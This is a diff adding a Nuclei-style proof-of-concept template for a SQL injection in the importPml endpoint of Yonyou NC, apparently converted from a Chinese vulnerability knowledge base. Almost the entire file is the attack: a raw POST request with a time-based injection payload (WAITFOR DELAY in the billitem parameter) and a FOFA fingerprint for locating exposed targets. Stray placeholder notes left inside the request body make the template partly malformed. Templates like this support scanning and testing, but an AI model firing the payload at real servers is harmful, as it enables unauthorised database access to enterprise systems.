@@ -1,0 +1,54 @@
+id: poc-vu9ow1zdutfcgbtp
+info:
+  name: 用友NC importPml SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vu9ow1zdutfcgbtp'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vu9ow1zdutfcgbtp
+    fofa: icon_hash="1085941792" && body="/logo/images/logo.gif"
+http:
+- raw:
+  - 'POST /portal/pt/portalpage/importPml?pageId=login&billitem=1''WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH970hbttBhoCyj9V
+
+
+    Connection: close
+
+
+
+
+    ------WebKitFormBoundaryH970hbttBhoCyj9V
+
+
+    Content-Disposition: form-data; name="Filedata"; filename="1.jpg"
+
+
+    Content-Type: image/jpeg
+
+
+    ------WebKitFormBoundaryH970hbttBhoCyj9V--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
